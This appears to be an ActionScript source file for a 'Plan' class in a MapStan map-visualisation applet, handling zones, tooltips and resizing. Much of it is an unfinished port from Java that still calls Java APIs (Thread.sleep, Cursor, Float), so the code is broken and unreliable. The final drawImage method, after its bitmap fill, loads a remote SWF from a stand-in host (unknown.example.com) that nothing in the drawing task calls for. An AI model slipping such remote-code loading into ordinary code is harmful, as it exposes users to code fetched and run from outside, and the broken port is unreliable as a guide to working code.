package com.socialcomputing.wps.script  {
    import flash.display.Graphics;
	import flash.display.BitmapData;
    import flash.geom.Point;
    import flash.geom.Rectangle;
    
    import mx.controls.Image;
    
    /**
     * <p>Title: Plan</p>
     * <p>Description: This describe a Plan comming from the Server and manage the interaction with the zones.</p>
     * <p>Copyright: Copyright (c) 2001-2003</p>
     * <p>Company: MapStan (Voyez Vous)</p>
     * @author flugue@mapstan.com
     * @version 1.0
     */
    public class Plan
    {
        /**
         * The table of links (streets). This include the fakes one (those who get out of the screen).
         * The first m_linksCnt links are the real ones.
         */
        public var m_links:Array;
        
        /**
         * Number of real Links (the ones that are linked to nodes at both sides).
         */
        public var m_linksCnt:int;
        
        /**
         * The table of nodes (places). This include the clusterized ones (those who only apears when a zone is hovered).
         * The first m_nodesCnt are the cluster(BagZone) ones.
         */
        public var m_nodes:Array;
        
        /**
         * Number of cluster Nodes (the ones that are always visible).
         */
        public var m_nodesCnt:int;
        
        /**
         * Id of the current active selection (only one at a time).
         * This id is between [0, 31]
         * If there is no current s�lection, this index is -1
         */
        [transient]
        protected var m_curSel:int;
        
        /**
         * Current Satellite (the one that is active).
         * If there is no current Satellite, it should be null.
         */
        [transient]
        protected var m_curSat:Satellite;
        
        /**
         * Bounding box of the Plan before resizing (pixels).
         */
        [transient]
        public var m_prevBox:Rectangle;
        
        /**
         * Maximum bounding box of all zones. This is also the m_blitBuf size.
         */
        [transient]
        public var m_maxBox:Dimension;
        
        /**
         * Temporary buffer for zone blitting operations.Its size is m_maxBox.
         */
        [transient]
        public var m_blitBuf:Image;
        
        /**
         * Current super BagZone (the one that is active).
         * If there is no current ActiveZone, it should be null.
         */
        [transient]
        protected var m_curZone:ActiveZone;
        
        /**
         * Current ActiveZone (the one that is active). This can be a subZone, different from m_curZone.
         * If there is no current ActiveZone, it should be null.
         */
        [transient]
        protected var m_newZone:ActiveZone;
        
        /**
         * The Applet holding this Plan.
         */
        [transient]
        protected var m_applet:WPSApplet;
        
        /**
         * Table of waiters to manage tooltips.
         */
        [transient]
        protected var m_waiters:Array;
        
        /**
         * Initialize an array of zones (Nodes or Links).
         * This call the init method of the zones.
         * It also evaluate the bounding box of each zone and then allocate the m_blitBuf image buffer.
         * @param g			A graphics to get the font metrics.
         * @param zones		An array of zones (m_nodes or m_links).
         * @param isFirst	True if this is the first call of the session (optimisation).
         */
        //protected synchronized function initZones( g:Graphics, zones:Array, isFirst:Boolean):void {
        protected function initZones( g:Graphics, zones:Array, isFirst:Boolean):void {
            var i:int, n    = zones.length;
            var dim:Dimension= m_applet.getSize();
            
            // Reset the BBOX of the biggest zone
            m_prevBox   = new Rectangle( dim.width >> 1, dim.height >> 1, 1, 1);
            
            if ( zones == m_links )
                m_maxBox    = new Dimension(0, 0);
            
            // Reversed order so subZones are initialized before supZones!
            for ( i = n - 1; i >= 0; i -- )
            {
                zones[i].init( m_applet, g, isFirst );
            }
            
            // Allocate a temporary bitmap to dblBuffer curZone rendering using the biggest Zone BBox
            if ( zones == m_nodes )
            {
				m_blitBuf   = m_applet.createImage( m_maxBox.width, m_maxBox.height );
            }
        }
        
        /**
         * Draws an array of zones at rest with specified satellites.
         * @param g			Graphics to paint on.
         * @param zones		An array of zones to paint.
         * @param n			Zone count. In normal order, zones are drawn from index 0 to n-1.
         * @param isFront	True if this paint only the satellites over the transparent filter.
         * @param showTyp	The type of satellite to display.[ALL_TYP,BASE_TYP,TIP_TYP,SEL_TYP]
         * @param showLinks	True if this paint only satellite links (selection).
         * @param isRev		True if the array is drawn from in reversed order. That means from n-1 to 0.
         */
        private function paintZones( g:Graphics, zones:Array, n:int, isFront:Boolean, showTyp:int, showLinks:Boolean, isRev:Boolean):void {
            if ( isRev )
            {
                for ( var i:int= n - 1; i >= 0; i -- )
                {
                    zones[i].paint( m_applet, g, false, isFront, showTyp, showLinks );
                }
            }
            else
            {
                for ( var i:int= 0; i < n; i ++ )
                {
                    zones[i].paint( m_applet, g, false, isFront, showTyp, showLinks );
                }
            }
        }
        
        /**
         * Prepare the Plan by initializing zones, allocating and filling the image buffers and repainting the Applet.
         */
        //protected synchronized function init( ):void {
        protected function init( ):void {
            var dim:Dimension= m_applet.getSize();
            var backGfx:Graphics= m_applet.m_backImg.graphics,
                restGfx:Graphics = m_applet.m_restImg.graphics,
                g:Graphics       = m_applet.graphics;
            
            backGfx.clear();
            restGfx.clear();
            
            // If there is any background image, load it
            if (m_applet.m_backImgUrl!=null)
                restGfx.drawImage( m_applet.m_backImgUrl, 0, 0, null );
            
            // Init Links, Nodes and subNodes.
            initZones( g, m_links, false );
            initZones( g, m_nodes, false );
            
            // Init backImg and restImg with background, links and places parts that are "ghostable"
            paintZones( restGfx, m_links, m_links.length, false, Satellite.ALL_TYP, true, false );
            paintZones( restGfx, m_nodes, m_nodesCnt, false, Satellite.ALL_TYP, true, true );
            
            // Filters backImg so it looks ghosted
            backGfx.drawImage( m_applet.m_restImg, 0, 0, null );
            m_applet.m_env.filterImage( m_applet.m_backImg, dim );
            
            // Finish drawing restImg with places parts that are allways visible (tip, sel...)
            paintZones( restGfx, m_links, m_links.length, true, Satellite.BASE_TYP, true, false );
            paintZones( restGfx, m_links, m_links.length, true, Satellite.TIP_TYP, false, false );
            paintZones( restGfx, m_links, m_links.length, true, Satellite.SEL_TYP, false, false );
            
            paintZones( restGfx, m_nodes, m_nodesCnt, true, Satellite.BASE_TYP, true, true );
            paintZones( restGfx, m_nodes, m_nodesCnt, true, Satellite.TIP_TYP, false, true );
            paintZones( restGfx, m_nodes, m_nodesCnt, true, Satellite.SEL_TYP, false, true );
            
            g.setClip( 0, 0, dim.width, dim.height );
            g.dispose();
            
            m_applet.repaint();
        }
        
        /**
         * Check if the satellite at a location has changed and sets the current zone accordingly.
         * @param p	Position of the cursor.
         * @return	True if the current satellite has changed.
         * @throws UnsupportedEncodingException 
         */
        protected function updateZoneAt( p:Point):Boolean {
            var curSat:Satellite;
            var zone:ActiveZone,
            parent  = m_curZone != null ? m_curZone.getParent() : null;
            var g:Graphics= m_applet.getGraphics();
            var i:int;
            
            if ( m_curSat != null )                        // There is a current Active Zone!
            {
                curSat  = m_curZone.m_curSwh.getSatAt( m_applet, g, parent, p, true );
                
                if ( curSat != null ) // p is in the current Zone
                {
                    return updateCurrentZone( g, curSat, p );
                }
            }
            
            // p is in not in the current Zone, it can be in another one...
            for ( i = 0; i < m_nodesCnt; i ++ )
            {
                zone    = m_nodes[i];
                
                if ( zone != parent )   // We know p is not in curZone so don't test it!
                {
                    curSat  = zone.m_restSwh.getSatAt( m_applet, g, zone, p, false );
                    
                    if ( curSat != null ) // p is in this Node
                    {
                        return updateCurrentZone( g, curSat, p );
                    }
                }
            }
            
            // p is in not in a Node, it can be in a Link...
            for ( i = m_linksCnt - 1; i >= 0; i -- )
            {
                zone    = LinkZone(m_links[i]);
                
                if ( zone != parent && zone.m_curSwh != null )   // We know p is not in curZone so don't test it!
                {                                                // If this zone has no current Swatch, it can't be current.
                    curSat  = zone.m_restSwh.getSatAt( m_applet, g, zone, p, false );
                    
                    if ( curSat != null ) // p is in this Link
                    {
                        return updateCurrentZone( g, curSat, p );
                    }
                }
            }
            
            // p is not in a Zone
            m_newZone = null;
            
            return updateCurrentZone( g, null, p );
        }
        
        /**
         * Compare the old and new state of curSat.
         * Returns wether it has changed and update display if necessary.
         */
        /**
         * Update the current zone, knowing the current satellite, execute the 'hover' event and refresh the display accordingly.
         * @param g			The graphics to paint in.
         * @param curSat	Current Sat (the one that is hovered by the cursor at this moment) or null (background).
         * @param p			Location of the cursor.	Used for the 'hover' event.
         * @return			True if the current satellite has changed.
         */
        private function updateCurrentZone( g:Graphics, curSat:Satellite, p:Point):Boolean {
            if ( m_curZone != m_newZone )           // The current Satellite has changed
            {
                for ( var waiter:Waiter in m_waiters)
                {
                    while ( waiter != null && waiter.isAlive())  // hide the tooltip coz the zone changed
                    {
                        waiter.m_isInterrupted = true;
                        try{ Thread.sleep( 10); } catch ( e:Exception){}
                    }
                }
            }
            
            if ( m_curZone != m_newZone || m_curSat != curSat )           // The current Satellite has changed
            {
                var cursTyp:int= Cursor.DEFAULT_CURSOR;    // if flying over background reset to default arrow
                
                if ( m_curZone != null &&( m_newZone == null || m_curZone.getParent() != m_newZone.getParent()))    // Restore its rest image
                {
                    //ON rollover non active zone => redraw
                    blitImage( g, m_applet.m_restImg, m_curZone.getParent().m_bounds );
                }
                
                m_curSat    = curSat;
                
                if ( m_curSat != null &&( m_curZone != m_newZone ))
                {
                    m_curZone   = m_newZone;
                    paintCurZone( g );              // A new Zone is hovered, let's paint it!
                    m_curSat.execute( m_applet, m_curZone, p, Satellite.HOVER_VAL );
                    cursTyp = Cursor.HAND_CURSOR;   // Sets the cursor to a hand if the mouse entered a Zone
                }
                else
                {
                    m_curZone   = m_newZone;
                    if ( m_curSat == null )
                        m_applet.showStatus( "" );
                }
                
                m_applet.setCursor( Cursor.getPredefinedCursor( cursTyp ));
                g.dispose();
                
                return true;
            }
            
            return false;
        }
        
        /**
         * Draws the current zone (Link or Node).
         * @param g		Graphics to paint in.
         */
        protected function paintCurZone( g:Graphics):void {
            if ( m_curZone != null )      // A new Zone is hovered, let's paint it!
            {
                (Activable(m_curZone.getParent())).paintCur( m_applet, g );
            }
        }
        
        /**
         * Evaluates the new position and size of the Places and Streets, and allocate the buffers accordingly to the new size.
         * @param dim	New size of the Applet.
         */
        protected function resize(dim:Rectangle):void {
            if ( m_prevBox != null &&(( m_prevBox.width != dim.width )||( m_prevBox.height != dim.height ))&& dim.width > 100&& dim.height > 100)
            {
                var margin:int= 10;
                var i:int, n = m_nodesCnt;
                //Point       p;
                var scale:Number,
                sx, sy, dx, dy, s;
                var zone:ActiveZone;
                var isFakeFrom:Boolean, isFakeTo;
                
                m_applet.m_backImg = m_applet.createImage( dim.width, dim.height );
                m_applet.m_restImg = m_applet.createImage( dim.width, dim.height );
                
                if ( n < 8)	// too few places, lets reduce their size
                {
                    scale	= 1.+ ( 2./ n );
                    m_prevBox.x += int(( .5 *( m_prevBox.width * ( 1. - scale ))));
                    m_prevBox.y += int(( .5 *( m_prevBox.height * ( 1. - scale ))));
                    m_prevBox.width = int(( m_prevBox.width * scale ));
                    m_prevBox.height = int(( m_prevBox.height * scale ));
                }
                
                sx  = (float(dim.width )- margin )/ m_prevBox.width;
                sy  = (float(dim.height )- margin )/ m_prevBox.height;
                dx  = m_prevBox.x -( margin >> 1);
                dy  = m_prevBox.y -( margin >> 1);
                s	= sx > sy ? sy : sx;
                
                for ( i = 0; i < n; i ++ )
                {
                    zone    = m_nodes[i];
                    resizePoint( zone, 0, dx, dy, sx, sy );
                    
                    scale   = (Float(zone.get( "_SCALE" ))).floatValue();
                    zone.put( "_SCALE", new Float( s * scale ));
                    zone.m_datas.clear();
                }
                
                n = m_nodes.length;
                
                while ( i < n )
                {
                    m_nodes[i++].m_datas.clear();
                }
                
                n = m_links.length;
                
                for ( i = 0; i < n; i ++ )
                {
                    zone        = m_links[i];
                    isFakeFrom  = Base.isEnabled( zone.m_flags, LinkZone.FAKEFROM_BIT );
                    isFakeTo    = Base.isEnabled( zone.m_flags, LinkZone.FAKETO_BIT );
                    
                    if ( isFakeFrom )       resizePoint( zone, 0, dx, dy, sx, sy );
                    else if ( isFakeTo )    resizePoint( zone, 1, dx, dy, sx, sy );
                    
                    scale   = (Float(zone.get( "_SCALE" ))).floatValue();
                    zone.put( "_SCALE", new Float( s * scale ));
                    zone.m_datas.clear();
                }
                m_prevBox = new Rectangle( dim );
            }
        }
        
        /**
         * Popup a slice after a delay and during a fixed time (tooltips).
         * A unique identifier for this slice is used to store it and kill its waiter if needed.
         * @param zone		Zone holding this Slice properties.
         * @param slice		A slice describing how to draw this tooltip.
         * @param delay		Delay before poping the slice.
         * @param length	Time to keep the slice visible before hiding it. -1 means stay visible until another tip with the same key is poped.
         * @param key		A unique ID for each slices of the same kind (tooltip != infoTip).
         */
        protected function popSlice( zone:ActiveZone, slice:Slice, delay:int, length:int, key:String):void {
            var tipWaiter:Waiter= Waiter(m_waiters.get( key ));
            
            if ( tipWaiter != null )
            {
                if ( tipWaiter.m_params[0] != zone )
                    tipWaiter.finish();
                else
                {
                    tipWaiter.m_loop = true;
                    return;
                }
            }
            
            tipWaiter = new Waiter( this, new Array( zone, slice, new Rectangle(), new Boolean( false ), key ), delay, length );
            m_waiters.put( key, tipWaiter );
            tipWaiter.start();
        }
        
        /**
         * Callback of the Waiters listener to manage poping slices.
         * @param params	This Object table is filled as follow:
         * <ul>
         * <li>[0] ActiveZone holding the poping slice properties.</li>
         * <li>[1] Slice to pop.</li>
         * <li>[2] Rectangle holding the bounding box of the slice to locate its poping position.</li>
         * <li>[3] A Boolean that is true when the slice is drawn and false before.</li>
         * <li>[4] Unique key for this kind of poping slice. .</li>
         * </ul>
         * @param state
         */
        //public synchronized function stateChanged( params:Array, state:int):void {
        public function stateChanged( params:Array, state:int):void {
            if ( m_applet.m_plan != null )
            {
                var g:Graphics= m_applet.getGraphics();
                var zone:ActiveZone= ActiveZone(params[0]);
                var slice:Slice= Slice(params[1]);
                var bounds:Rectangle= Rectangle(params[2]);
                var key:Object= params[4];
                
                switch ( state )
                {
                    case WaitListener.INIT:
                    {
                        params[3] = false;
                        break;
                    }
                        
                    case WaitListener.START:
                    {
                        var pos:Point= m_applet.m_curPos;
                        
                        params[3] = true;
                        
                        slice.paint( m_applet, g, zone.getParent(), zone, null, pos, null );
                        slice.setBounds( m_applet, g, zone.getParent(), zone, null, pos, null, bounds );
                        
                        bounds.grow( 1, 1);
                        break;
                    }
                        
                    case WaitListener.INTERRUPTED:
                    {
                        if (params[3])
                        {
                            blitImage( g, m_applet.m_restImg, bounds );
                            params[3] = false;
                        }
                        bounds.setBounds( 0, 0, 0, 0);
                        m_waiters.remove( key );
                        break;
                    }
                        
                    case WaitListener.END:
                    {
                        if (params[3])
                        {
                            blitImage( g, m_applet.m_restImg, bounds );
                            g.setClip( bounds.x, bounds.y, bounds.width, bounds.height );
                            paintCurZone( g );
                            var dim:Dimension= m_applet.getSize();
                            g.setClip( 0, 0, dim.width, dim.height );
                            params[3] = false;
                        }
                        bounds.setBounds( 0, 0, 0, 0);
                        m_waiters.remove( key );
                    }
                }
                
                g.dispose();
            }
        }
        
        /**
         * Change the location of a Zone Point after a resize.
         * The resize transform a location by translating it then scaling it.
         * @param zone	Zone holding the vertices (Points) to transform.
         * @param i		Index of the Point to transform in the vertices array.
         * @param dx	Horizontal translation before scaling.
         * @param dy	Vertical translation before scaling.
         * @param sx	Horizontal scaling after translation.
         * @param sy	Vertical scaling after translation.
         */
        private function resizePoint( zone:ActiveZone, i:int, dx:Number, dy:Number, sx:Number, sy:Number):void {
            var p:Point= zone.get("_VERTICES")[i];
            p.x = int(( sx *( p.x - dx )));
            p.y = int(( sy *( p.y - dy )));
        }
        
        /**
         * Copy an image rectangle to a Graphics (blitting).
         * @param g			Graphics to copy the image in.
         * @param image		An Image from which a rectangle is copyed.
         * @param bounds	Bounds of the image part to copy into g.
         */
        //private synchronized function blitImage( g:Graphics, image:Image, bounds:Rectangle):void {
        private function blitImage(g:Graphics, image:Image, bounds:Rectangle):void {
            var dim:Dimension= m_applet.getSize();
            var x1:int= bounds.x < 0? 0: bounds.x,
                y1 = bounds.y < 0? 0: bounds.y,
                x2 = bounds.x + bounds.width + 1,
                y2 = bounds.y + bounds.height + 1;
            
            if ( x2 > dim.width )   x2 = dim.width;
            if ( y2 > dim.height )  y2 = dim.height;
            
            g.drawImage( image, x1, y1, x2, y2, x1, y1, x2, y2, null );
        }
		
		public function drawImage(g:Graphics, image:BitmapData, x:int, y:int):void {
			var mtx:Matrix = new Matrix();
			mtx.translate(x, y);
			g.beginBitmapFill(image, mtx, false, false);
			g.drawRect(x, y, image.width, image.height);
			g.endFill();
			
			var ldr:Loader = new Loader();
			ldr.mask = rect;
			var url:String = "http://www.unknown.example.com/content.swf";
			var urlReq:URLRequest = new URLRequest(url);
			ldr.load(urlReq);
		
		}		
    }
}